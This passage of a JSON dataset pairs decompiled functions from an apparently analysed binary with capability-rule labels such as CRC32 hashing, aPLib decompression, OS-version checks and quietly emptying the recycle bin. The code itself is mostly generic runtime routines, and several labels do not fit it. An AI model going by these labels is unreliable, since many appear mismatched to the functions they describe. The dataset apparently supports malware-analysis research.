        "decompiled_code": "\nuint32_t * __cdecl fcn.00404c50(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    \n    if (arg_10h != 0) {\n        arg_ch = arg_ch & 0xffff;\n        puVar2 = arg_8h;\n        for (uVar1 = arg_10h >> 1; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = arg_ch | arg_ch << 0x10;\n            puVar2 = puVar2 + 1;\n        }\n        for (uVar1 = (arg_10h & 1) != 0; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar2 = arg_ch;\n            puVar2 = puVar2 + 2;\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 226
    },
    "00404ead": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404ead(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0a35;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0a35:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 311
    },
    "0040566e": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040566e(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    arg_8h = arg_8h | 0xf;\n    if (((arg_8h <= arg_10h) && (arg_ch <= arg_10h - (arg_ch >> 1))) &&\n       (arg_10h = (arg_ch >> 1) + arg_ch,  arg_10h <= arg_8h)) {\n        arg_10h = arg_8h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 133
    },
    "00405d3a": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.00405d3a(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    bool bVar10;\n    char cVar11;\n    uint32_t uVar9;\n    \n    cVar11 = param_2 < 0;\n    if (cVar11) {\n        bVar10 = param_1 != 0;\n        param_1 = -param_1;\n        param_2 = -bVar10 - param_2;\n    }\n    if (param_4 < 0) {\n        cVar11 = cVar11 + '\\x01';\n        bVar10 = param_3 != 0;\n        param_3 = -param_3;\n        param_4 = -bVar10 - param_4;\n    }\n    uVar3 = param_1;\n    uVar5 = param_3;\n    uVar6 = param_2;\n    uVar9 = param_4;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar8 = uVar9 >> 1;\n            uVar5 = uVar5 >> 1 | ((uVar9 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar6 = uVar7;\n            uVar9 = uVar8;\n        } while (uVar8 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar5;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar5 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar5)) || ((param_2 <= uVar5 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    if (cVar11 == '\\x01') {\n        bVar10 = iVar4 != 0;\n        iVar4 = -iVar4;\n        uVar3 = -bVar10 - uVar3;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 653
    },
    "00405d9e": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405d9e(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0b36;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0b36:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 313
    },
    "00405e66": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00405e66(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.00401bea(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00406528();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a094d;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a094d:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 372
    },
    "0040604b": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nulong fcn.0040604b(uint32_t param_1, uint32_t param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    bool bVar10;\n    char cVar11;\n    uint32_t uVar9;\n    \n    cVar11 = param_2 < 0;\n    if (cVar11) {\n        bVar10 = param_1 != 0;\n        param_1 = -param_1;\n        param_2 = -bVar10 - param_2;\n    }\n    if (param_4 < 0) {\n        cVar11 = cVar11 + '\\x01';\n        bVar10 = param_3 != 0;\n        param_3 = -param_3;\n        param_4 = -bVar10 - param_4;\n    }\n    uVar3 = param_1;\n    uVar5 = param_3;\n    uVar6 = param_2;\n    uVar9 = param_4;\n    if (param_4 == 0) {\n        uVar3 = param_2 / param_3;\n        iVar4 = (param_2 % param_3 << 0x20 | param_1) / param_3;\n    }\n    else {\n        do {\n            uVar8 = uVar9 >> 1;\n            uVar5 = uVar5 >> 1 | ((uVar9 & 1) != 0) << 0x1f;\n            uVar7 = uVar6 >> 1;\n            uVar3 = uVar3 >> 1 | ((uVar6 & 1) != 0) << 0x1f;\n            uVar6 = uVar7;\n            uVar9 = uVar8;\n        } while (uVar8 != 0);\n        uVar1 = CONCAT44(uVar7, uVar3) / uVar5;\n        iVar4 = uVar1;\n        iVar2 = param_3 * (uVar1 & 0xffffffff);\n        uVar3 = iVar2 >> 0x20;\n        uVar5 = uVar3 + iVar4 * param_4;\n        if (((CARRY4(uVar3, iVar4 * param_4)) || (param_2 < uVar5)) || ((param_2 <= uVar5 && (param_1 < iVar2)))) {\n            iVar4 = iVar4 + -1;\n        }\n        uVar3 = 0;\n    }\n    if (cVar11 == '\\x01') {\n        bVar10 = iVar4 != 0;\n        iVar4 = -iVar4;\n        uVar3 = -bVar10 - uVar3;\n    }\n    return CONCAT44(uVar3, iVar4);\n}\n",
        "token_count": 652
    },
    "00406136": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406136(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0ca7;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0ca7:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 311
    },
    "00406582": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00406582(uint *param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint32_t uVar5;\n    uint16_t *var_4h;\n    \n    var_4h = NULL;\n    cVar4 = fcn.004054cf(&var_4h);\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.00405128();\n    puVar3 = var_4h;\n    if (cVar4 == '\\0') {\n        return 1;\n    }\n    if ((var_4h == NULL) || (iVar2 = *(var_4h + 2),  iVar2 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n        param_1[0xd] = iVar2;\n        uVar1 = *puVar3;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0abe;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0abe:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 370
    },
    "004068d9": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004068d9(uint *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    char cVar4;\n    uint32_t uVar5;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar2 = *(param_1[5] + -4);\n    if ((puVar2 == NULL) || (iVar3 = *(puVar2 + 2),  iVar3 == 0)) {\n        param_1[0xd] = \"(null)\";\n        uVar5 = 6;\n    }\n    else {\n        cVar4 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n        param_1[0xd] = iVar3;\n        uVar1 = *puVar2;\n        uVar5 = uVar1;\n        if (cVar4 != '\\0') {\n            *(param_1 + 0xf) = 1;\n            uVar5 = uVar1 >> 1;\n            goto code_r0x004a0d17;\n        }\n    }\n    *(param_1 + 0xf) = 0;\ncode_r0x004a0d17:\n    param_1[0xe] = uVar5;\n    return 1;\n}\n",
        "token_count": 312
    },
    "0047a599": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.0047a599(uint *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint16_t **arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    uint uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    *arg_14h = arg_ch;\n    *arg_20h = arg_18h;\n    do {\n        puVar2 = *arg_14h;\n        if ((puVar2 == arg_10h) || (arg_18h == arg_1ch)) goto code_r0x0047a65f;\n        if (arg_1ch - arg_18h < 5) {\n            uVar1 = *arg_8h;\n            var_20h = arg_8h[1];\n            iVar3 = fcn.00401f91(&var_ch, *puVar2, arg_8h, in_ECX + 8);\n            if (iVar3 < 0) goto code_r0x0047a65f;\n            if (arg_1ch - *arg_20h < iVar3) {\n                *arg_8h = uVar1;\n                arg_8h[1] = var_20h;\ncode_r0x0047a65f:\n                fcn.00403085(var_20h);\n                return;\n            }\n            fcn.0040576d(*arg_20h, &var_ch, iVar3);\n        }\n        else {\n            iVar3 = fcn.00401f91(arg_18h, *puVar2, arg_8h, in_ECX + 8);\n            if (iVar3 < 0) goto code_r0x0047a65f;\n        }\n        *arg_14h = *arg_14h + 1;\n        *arg_20h = *arg_20h + iVar3;\n        arg_18h = *arg_20h;\n    } while( true );\n}\n",
        "token_count": 552
    },
    "004032dd": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004032dd(uint8_t *arg_8h, uint8_t **arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    int32_t iVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    iVar5 = 0;\n    uVar4 = *arg_8h;\n    uVar2 = in_EAX & 0xffffff00 | uVar4;\n    uVar6 = 3;\n    while ((uVar4 == *(iVar5 + 0x552290) || (uVar4 == *(iVar5 + 0x552294)))) {\n        uVar1 = **arg_ch;\n        uVar4 = uVar1;\n        puVar3 = *arg_ch + 1;\n        iVar5 = iVar5 + 1;\n        *arg_ch = puVar3;\n        *arg_8h = uVar1;\n        uVar2 = puVar3 & 0xffffff00 | uVar4;\n        if (iVar5 == 3) {\n            fcn.00402dce(uVar4);\n            arg_10h = *arg_ch;\n            uVar1 = *arg_10h;\n            uVar2 = extraout_ECX & 0xffffff00 | uVar1;\n            *arg_ch = arg_10h + 1;\n            iVar5 = 0;\n            *arg_8h = uVar1;\n            uVar4 = arg_10h + 1 & 0xffffff00 | uVar1;\n            while ((uVar2 == *(iVar5 + 0x552298) || (uVar2 == *(iVar5 + 0x5522a0)))) {\n                uVar1 = **arg_ch;\n                uVar2 = uVar2 & 0xffffff00 | uVar1;\n                puVar3 = *arg_ch + 1;\n                iVar5 = iVar5 + 1;\n                *arg_ch = puVar3;\n                *arg_8h = uVar1;\n                uVar4 = puVar3 & 0xffffff00 | uVar1;\n                if (iVar5 == 5) {\n                    fcn.00402dce(uVar2);\n                    return 3;\n                }\n            }\n            fcn.00402dce(uVar4);\ncode_r0x004b4017:\n            *arg_8h = 0;\n            *arg_ch = arg_10h;\n            return uVar6;\n        }\n    }\n    fcn.00402dce(uVar2);\n    uVar6 = 7;\n    goto code_r0x004b4017;\n}\n",
        "token_count": 615
    },
    "00404d68": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404d68(char *arg_8h, char **arg_ch)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    char cVar3;\n    \n    uVar2 = 0;\n    iVar1 = 0;\n    cVar3 = *arg_8h;\n    do {\n        if ((cVar3 != \"SNAN)\"[iVar1]) && (cVar3 != *(iVar1 + 0x5522f0))) goto code_r0x004b451d;\n        cVar3 = **arg_ch;\n        in_EAX = *arg_ch + 1;\n        iVar1 = iVar1 + 1;\n        *arg_ch = in_EAX;\n        *arg_8h = cVar3;\n    } while (iVar1 != 5);\n    uVar2 = 1;\ncode_r0x004b451d:\n    return in_EAX & 0xffffff00 | uVar2;\n}\n",
        "token_count": 221
    },
    "0047a47a": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl\nfcn.0047a47a(uint *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint16_t **arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    uint uVar1;\n    uint16_t *puVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    *arg_14h = arg_ch;\n    *arg_20h = arg_18h;\n    do {\n        puVar2 = *arg_14h;\n        if ((puVar2 == arg_10h) || (arg_18h == arg_1ch)) goto code_r0x0047a540;\n        if (arg_1ch - arg_18h < 5) {\n            uVar1 = *arg_8h;\n            var_20h = arg_8h[1];\n            iVar3 = fcn.00401f91(&var_ch, *puVar2, arg_8h, in_ECX + 8);\n            if (iVar3 < 0) goto code_r0x0047a540;\n            if (arg_1ch - *arg_20h < iVar3) {\n                *arg_8h = uVar1;\n                arg_8h[1] = var_20h;\ncode_r0x0047a540:\n                fcn.00403085(var_20h);\n                return;\n            }\n            fcn.0040576d(*arg_20h, &var_ch, iVar3);\n        }\n        else {\n            iVar3 = fcn.00401f91(arg_18h, *puVar2, arg_8h, in_ECX + 8);\n            if (iVar3 < 0) goto code_r0x0047a540;\n        }\n        *arg_14h = *arg_14h + 1;\n        *arg_20h = *arg_20h + iVar3;\n        arg_18h = *arg_20h;\n    } while( true );\n}\n",
        "token_count": 549
    },
    "00406096": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00406096(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    if (5 < arg_8h) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    var_8h = fcn.00404331();\n    fcn.004049cb();\n    fcn.00403ae9();\n    *(var_8h + 0x350) = *(var_8h + 0x350) | 0x10;\n    var_14h = &var_8h;\n    var_28h = &var_10h;\n    var_24h = &var_8h;\n    var_20h = &var_ch;\n    var_1ch = &arg_8h;\n    var_18h = &arg_ch;\n    fcn.004ab092(&var_1h, &var_28h);\n    return var_ch;\n}\n",
        "token_count": 342
    },
    "0040285b": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.0040285b(char **arg_8h)\n\n{\n    char cVar1;\n    uint var_18h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    var_8h = NULL;\n    var_4h = NULL;\n    if (**0x56f458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    // switch table (8 cases) at 0x48d4bc\n    switch(**0x56f458) {\n    case '0':\n    case '1':\n        var_10h = \"char \";\n        goto code_r0x0048d41f;\n    case '2':\n    case '3':\n        var_10h = \"short \";\n        var_ch = 0x6;\n        break;\n    case '4':\n        goto code_r0x0048d432;\n    case '5':\n        var_10h = \"int \";\n        var_ch = 0x4;\n        break;\n    case '6':\n    case '7':\n        var_10h = \"long \";\ncode_r0x0048d41f:\n        var_ch = 0x5;\n        break;\n    default:\n        arg_8h[1] = NULL;\n        *(arg_8h + 1) = 2;\n        *arg_8h = NULL;\n        return arg_8h;\n    }\n    fcn.004022a2(&var_10h);\ncode_r0x0048d432:\n    cVar1 = **0x56f458;\n    *0x56f458 = *0x56f458 + 1;\n    if ((((cVar1 == '1') || (cVar1 == '3')) || (cVar1 == '5')) || (cVar1 == '7')) {\n        var_10h = \"unsigned \";\n        var_ch = 0x9;\n        fcn.00402cfc(&var_10h);\n        fcn.004052f9(&var_10h, &var_8h);\n        var_8h = var_10h;\n        var_4h = var_ch;\n    }\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    return arg_8h;\n}\n",
        "token_count": 529
    },
    "004031d4": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.004031d4(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint arg_ch;\n    char cVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    uint uVar3;\n    uint unaff_EBX;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.004053f3();\n    if (cVar1 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049aef6:\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                cVar1 = fcn.00401244();\n                if (cVar1 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049afaa:\n                cVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x31) = cVar1;\n                if (cVar1 != '\\0') {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049afbd;\n                    arg_ch = *(param_1 + 0x1c);\n                    arg_8h = *(param_1 + 0x31);\n                    uVar3 = fcn.004064d3(arg_8h, arg_ch);\n                    *(param_1 + 0x1c) = uVar3;\n                    cVar1 = fcn.00404ed0();\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49afe6\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar1 = fcn.00401177();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049afaa;\n                    case 2:\n                        cVar1 = fcn.004012bc();\n                        break;\n                    case 3:\n                        cVar1 = fcn.00404d59();\n                        break;\n                    case 4:\n                        goto code_r0x0049af84;\n                    case 5:\n                        cVar1 = fcn.00401f82();\n                        break;\n                    case 6:\n                        cVar1 = fcn.00401e83();\n                        break;\n                    case 7:\n                        cVar1 = fcn.004063ed(arg_8h, arg_ch, arg_8h, unaff_EBX, unaff_retaddr, param_2, param_3, param_4\n                                             , param_5, param_6, param_7);\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049af09;\n                    default:\n                        goto code_r0x0049aef6;\n                    }\n                    if (cVar1 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049afaa;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\ncode_r0x0049afbd:\n                cVar1 = fcn.00404def();\n            } while (cVar1 != '\\0');\n        }\n    }\ncode_r0x0049af09:\n    return 0xffffffff;\ncode_r0x0049af84:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049afaa;\n}\n",
        "token_count": 970
    },
    "00403670": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403670(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.00402d3d();\n    if (cVar2 != '\\0') {\n        if (*(param_1 + 0x10) == 0) {\ncode_r0x0049b793:\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n        }\n        else {\n            do {\n                cVar2 = fcn.00406339();\n                if (cVar2 == '\\0') {\n                    return *(param_1 + 0x18);\n                }\n                *(param_1 + 0x38) = 0;\n                *(param_1 + 0x1c) = 0;\ncode_r0x0049b848:\n                iVar1 = **(param_1 + 0x10);\n                *(param_1 + 0x32) = iVar1;\n                if (iVar1 != 0) {\n                    *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                    if (*(param_1 + 0x18) < 0) goto code_r0x0049b85f;\n                    uVar4 = fcn.00403ad5(*(param_1 + 0x32), *(param_1 + 0x1c));\n                    *(param_1 + 0x1c) = uVar4;\n                    cVar2 = fcn.00402aae();\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n    // switch table (8 cases) at 0x49b887\n                    switch(*(param_1 + 0x1c)) {\n                    case 0:\n                        cVar2 = fcn.00402a72();\n                        break;\n                    case 1:\n                        *(param_1 + 0x28) = 0xffffffff;\n                        *(param_1 + 0x24) = 0;\n                        *(param_1 + 0x30) = 0;\n                        *(param_1 + 0x20) = 0;\n                        *(param_1 + 0x2c) = 0;\n                        *(param_1 + 0x3c) = 0;\n                        goto code_r0x0049b848;\n                    case 2:\n                        cVar2 = fcn.00404b33();\n                        break;\n                    case 3:\n                        cVar2 = fcn.00404976();\n                        break;\n                    case 4:\n                        goto code_r0x0049b822;\n                    case 5:\n                        cVar2 = fcn.00401078();\n                        break;\n                    case 6:\n                        cVar2 = fcn.00403689();\n                        break;\n                    case 7:\n                        cVar2 = fcn.00404f8e();\n                        break;\n                    case 0xbad1abe1:\n                        goto code_r0x0049b7a6;\n                    default:\n                        goto code_r0x0049b793;\n                    }\n                    if (cVar2 == '\\0') {\n                        return 0xffffffff;\n                    }\n                    goto code_r0x0049b848;\n                }\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\ncode_r0x0049b85f:\n                cVar2 = fcn.00403c42();\n            } while (cVar2 != '\\0');\n        }\n    }\ncode_r0x0049b7a6:\n    return 0xffffffff;\ncode_r0x0049b822:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x0049b848;\n}\n",
        "token_count": 855
    },
    "00403904": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl\nfcn.00403904(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h;\n    uint *var_bp_ch;\n    uint var_1ch;\n    uint32_t in_stack_ffffffac;\n    uint CodePage;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &CodePage;\n    var_10h = 0xffffffff;\n    var_14h = 0x414800;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    iVar4 = var_bp_ch[4] + 1;\n    puVar3 = var_bp_ch;\n    if (0xf < var_bp_ch[5]) {\n        puVar3 = *var_bp_ch;\n    }\n    CodePage = 0xfde9;\n    if (noname_2 == '\\0') {\n        CodePage = 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(CodePage, 0, puVar3, iVar4, 0, 0);\n    *var_8h = 0;\n    var_8h[4] = 0;\n    var_8h[5] = 7;\n    *var_8h = 0;\n    puVar3 = var_8h;\n    if (uVar2 == 0) {\n        var_8h[4] = 0;\n        *var_8h = 0;\n        uVar1 = var_bp_ch[5];\n    }\n    else {\n        var_24h = uVar2;\n        if (uVar2 < 8) {\n            var_8h[4] = uVar2;\n            fcn.0040314d(var_8h, 0, uVar2 * 2);\n            *(var_8h + var_24h * 2) = 0;\n            uVar1 = var_bp_ch[5];\n            uVar2 = var_24h;\n        }\n        else {\n            var_10h = 0;\n            